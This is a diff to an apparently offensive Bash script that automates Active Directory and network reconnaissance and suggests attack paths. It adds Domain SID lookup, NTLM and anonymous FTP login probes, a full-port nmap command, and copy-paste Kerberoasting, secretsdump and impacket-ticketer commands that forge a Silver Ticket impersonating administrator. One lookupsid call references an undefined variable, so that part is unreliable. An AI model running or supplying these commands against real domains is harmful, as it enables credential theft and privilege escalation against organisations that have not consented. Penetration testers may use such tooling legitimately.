@@ -45,6 +45,7 @@ TARGET=""
 TARGET_IPV4=""
 TARGET_FQDN=""
 DOMAIN_CONTROLLER=""
+DOMAIN_SID=""
 ENABLE_VHOST=false
 ENABLE_MSSQL_BRUTE=false
 ENABLE_MSSQL_ENUM=false
@@ -1848,6 +1849,7 @@ declare -A RPC_UUID_ATTACKS=(
 )
 
 parse_rpcdump_and_map_attacks() {
+    set +e  # Disable exit-on-error for this function
     local target="$1"
     local dump_file="rpcdump_${target}_anon.txt"
 
@@ -1881,6 +1883,7 @@ parse_rpcdump_and_map_attacks() {
 }
 
 check_rpc_services() {
+    set +e  # Disable exit-on-error for this function
     local target="$1"
 
     # ------------------------------
@@ -1978,46 +1981,97 @@ check_smb_protocols() {
 
 
 check_ntlm_support() {
+    set +e  # Disable exit-on-error for this function
     local TARGET_IP=$1
 
     SMB_SIGNING=false
 
-    if command -v crackmapexec >/dev/null 2>&1; then
-        info "Checking SMB signing and NTLM support via CME"
-
-        CME_OUT=$(crackmapexec smb "$TARGET_IP" 2>/dev/null)
-
-        if echo "$CME_OUT" | grep -q "signing:.*True"; then
-            info "SMB Signing is enforced"
-            SMB_SIGNING=true
-        else
-            notify "SMB Signing is NOT enforced!"
-        fi
-
-        if echo "$CME_OUT" | grep -q "SMBv1:.*True"; then
-            notify "SMBv1 is ENABLED (insecure)!"
-            SMB_V1=true
-        fi
-
-        echo
-        info "Testing NTLM support via guest login"
-        OUT=$(crackmapexec smb "$TARGET_IP" -u "guest" -p "" 2>/dev/null)
-
-        if echo "$OUT" | grep -q "STATUS_NOT_SUPPORTED"; then
-            notify "NTLM authentication appears to be DISABLED (STATUS_NOT_SUPPORTED)"
-        elif echo "$OUT" | grep -q "\[-\]"; then
-            notify "NTLM authentication attempted, but failed — NTLM likely ENABLED!"
-            NTLM_ENABLED=true
-        elif echo "$OUT" | grep -q "\[+\]"; then
-            critical "NTLM authentication SUCCESSFUL — NTLM is ENABLED!"
-            NTLM_ENABLED=true
-        else
-            warn "NTLM test inconclusive — unknown response"
-        fi
+    # Pick tool: prefer CME, fall back to NXC
+    if command -v nxc >/dev/null 2>&1; then
+        TOOL="nxc"
+        TOOL_NAME="NXC"
+    elif command -v crackmapexec >/dev/null 2>&1; then
+        TOOL="crackmapexec"
+        TOOL_NAME="CME"
     else
-        warn "crackmapexec not found — skipping NTLM check"
+        warn "Neither crackmapexec nor netexec found — skipping NTLM check"
+        return 1
+    fi
+
+    info "Checking SMB signing and NTLM support via $TOOL_NAME"
+
+    TOOL_OUT=$("$TOOL" smb "$TARGET_IP" 2>/dev/null)
+
+    if echo "$TOOL_OUT" | grep -q "signing:.*True"; then
+        info "SMB Signing is enforced"
+        SMB_SIGNING=true
+    else
+        notify "SMB Signing is NOT enforced!"
+    fi
+
+    if echo "$TOOL_OUT" | grep -q "SMBv1:.*True"; then
+        notify "SMBv1 is ENABLED (insecure)!"
+        SMB_V1=true
+    fi
+
+    echo
+    info "Testing NTLM support via guest login using $TOOL_NAME"
+    OUT=$("$TOOL" smb "$TARGET_IP" -u "guest" -p "" 2>/dev/null)
+
+    if echo "$OUT" | grep -q "STATUS_NOT_SUPPORTED"; then
+        notify "NTLM authentication appears to be DISABLED (STATUS_NOT_SUPPORTED)"
+    elif echo "$OUT" | grep -q "\[-\]"; then
+        notify "NTLM authentication attempted, but failed — NTLM likely ENABLED"
+        NTLM_ENABLED=true
+    elif echo "$OUT" | grep -q "\[+\]"; then
+        critical "NTLM authentication SUCCESSFUL — NTLM is ENABLED!"
+        NTLM_ENABLED=true
+    else
+        warn "NTLM test inconclusive — unknown response"
     fi
 }
+
+get_domain_sid() {
+    local domain_user="$1"
+    local password="$2"
+    local target_domain_controller="$3"
+    local ntlm_on="$4"  # optional: pass "true" to use -k
+    echo
+    # Ensure lookupsid.py exists in PATH
+    if ! command -v impacket-lookupsid >/dev/null 2>&1; then
+        warn "impacket-lookupsid not found in PATH. Install Impacket or add to PATH."
+        return 1
+    fi
+    
+    local sid_output
+    local l_domain_sid
+    
+    info "Enumerating Domain SID for $target_domain_controller with user $domain_user..."
+
+    if [[ "$ntlm_on" == "true" ]]; then
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}impacket-lookupsid ${domain_user}:${password}@${target_domain_controller}${RESET}"
+        
+        sid_output=$(impacket-lookupsid "$domain_user:$password@$target_host"  2>/dev/null)
+    else
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}impacket-lookupsid ${domain_user}:${password}@${target_domain_controller} -k${RESET}"
+        sid_output=$(impacket-lookupsid "$domain_user:$password@$target_domain_controller" -k 2>/dev/null)
+    fi
+
+    l_domain_sid=$(echo "$sid_output" | grep -i "Domain SID is:" | awk -F': ' '{print $2}')
+
+    if [[ -n "$l_domain_sid" ]]; then
+        success "Domain SID found: ${BLUE}$l_domain_sid${RESET}"
+        echo "$l_domain_sid" > "domain_sid_${target_domain_controller}.txt"
+        DOMAIN_SID=$l_domain_sid
+    else
+        warn "Failed to extract Domain SID."
+        echo "$sid_output" > "lookupsid_debug_${target_domain_controller}.log"
+    fi
+}
+
+
 # -------------------------------------------------------
 # ------------------------ START ------------------------
 # -------------------------------------------------------
@@ -2269,6 +2323,12 @@ fi
 # --------- Debug / Visibility ----------
 if [ "${#OPEN_PORTS[@]}" -gt 0 ]; then
     echo
+    
+    info "This is a simple port scan, make sure you check for all available ports!"
+    echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+    echo -e "           ${GREEN}nmap -p- --min-rate=8000 $TARGET_IPV4 | grep --color=always -E 'open|filtered|closed|^|$'${RESET}"
+    
+    echo
     info "Open ports detected: ${OPEN_PORTS[*]}"
     echo
     info "CVE / Attack Surface Hints:"
@@ -2299,23 +2359,23 @@ if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "21"; then
     info "FTP detected — running checks"
 
     # --- Anonymous check ---
-    if command -v ftp >/dev/null; then
-        if echo -e "user anonymous\npass anonymous\nquit" \
-            | timeout 5 ftp -n "$TARGET_IPV4" 2>/dev/null \
-            | grep -qi "^230"; then
-
-            critical "Anonymous FTP login allowed"
-            FTP_ANON_OK=true
-        else
-            notify "Anonymous FTP login not permitted"
-        fi
+    FTP_OUT_1=$(
+        printf 'user anonymous anonymous\nquit\n' \
+            | timeout 5 ftp -inv "$TARGET_IPV4" 2>&1 \
+            | tr -d '\r'
+    )
+    if printf '%s\n' "$FTP_OUT_1" | grep -qi '^230'; then
+        critical "Anonymous FTP login allowed"
+        echo -e "        ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "           ${GREEN}ftp anonymous@$TARGET_IPV4${RESET}"
+        FTP_ANON_OK=true
+    else
+        notify "Anonymous FTP login not permitted"
     fi
 
     # --- Authenticated check (only if creds provided) ---
     if $CREDS_PROVIDED; then
         ftp_auth_check "$TARGET_IPV4" "$AUTH_USER" "$AUTH_PASS"
-    else
-        note "No credentials provided — skipping authenticated FTP check"
     fi
 fi
 
@@ -3085,6 +3145,11 @@ if [ "$WINRM_DETECTED" = true ]; then
     check_winrm_privs
 fi
 
+# Check for & get Domain SID
+if (( HAS_SMB == 1 )) && [[ "$CREDS_PROVIDED" == true && "$SMB_AUTH_OK" == true && -n "$DOMAIN_CONTROLLER" ]]; then
+    get_domain_sid "${AUTH_DOMAIN:-$LDAP_DOMAIN}/$AUTH_USER" "$AUTH_PASS" "$DOMAIN_CONTROLLER" "$NTLM_ENABLED"
+fi
+
 ###########################################
 # AD CS Vulnerable Certificate Detection
 ###########################################
@@ -3761,13 +3826,16 @@ attack_path_evaluation() {
         echo ""
         critical "Attack Path: Silver Ticket Attack is Viable"
         lightbulb "Next Steps:"
-        echo -e "   - Crack the Kerberoast hash for the SPN account: ${YELLOW}$SPN_NAME${RESET}"
+        echo -e "   - Obtain Domain SID for ${AUTH_DOMAIN:-$LDAP_DOMAIN}: ${YELLOW}$DOMAIN_SID${RESET}" 
+        echo -e "   - Crack the Kerberoast hash for the SPN account: ${YELLOW}$SPN_NAME${RESET}" 
         echo -e "   - Acquire the NTLM hash for the pwned SPN Account."
         echo -e "         ${GREEN}impacket-secretsdump ${AUTH_DOMAIN:-$LDAP_DOMAIN}/$KERBEROAST_USER:[CrackedPassword]@$TARGET_IPV4"
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-        echo -e "        ${GREEN}impacket-GetUserSPNs '${AUTH_DOMAIN:-$LDAP_DOMAIN}//$AUTH_USER:$AUTH_PASS' -k -dc-ip $TARGET_IPV4 -dc-host $DOMAIN_CONTROLLER -request ${RESET}"
+        echo -e "        ${GREEN}impacket-GetUserSPNs '${AUTH_DOMAIN:-$LDAP_DOMAIN}//$AUTH_USER:$AUTH_PASS' -k -dc-ip $TARGET_IPV4 -dc-host $DOMAIN_CONTROLLER ${RESET}"
+        echo -e "                   OR "
+        echo -e "        ${GREEN}ntlmhashgen.py -u [target_user] -p [CrackedPassword] ${RESET}"
         echo -e "   - Use the hash to forge a Silver Ticket:"
-        echo -e "         ${GREEN}impacket-ticketer -nthash <NTLM> -domain ${AUTH_DOMAIN:-$LDAP_DOMAIN} -user $KERBEROAST_USER -spn $SPN_NAME${RESET}"
+        echo -e "         ${GREEN}impacket-ticketer -nthash <NTLM> -domain ${AUTH_DOMAIN:-$LDAP_DOMAIN} -user ${AUTH_USER} -password '${AUTH_PASS}' -spn ${SPN_NAME} -domain-sid '${DOMAIN_SID}' -dc-ip $DOMAIN_CONTROLLER administrator${RESET}"
         echo -e "         ${GREEN}export KRB5CCNAME=silver_ticket.ccache${RESET}"
         echo -e "         ${GREEN}impacket-smbclient -k -no-pass $KERBEROAST_USER/$TARGET_IPV4${RESET}"
         echo -e "   - Test access to MSSQL, SMB, or other SPN-related services"
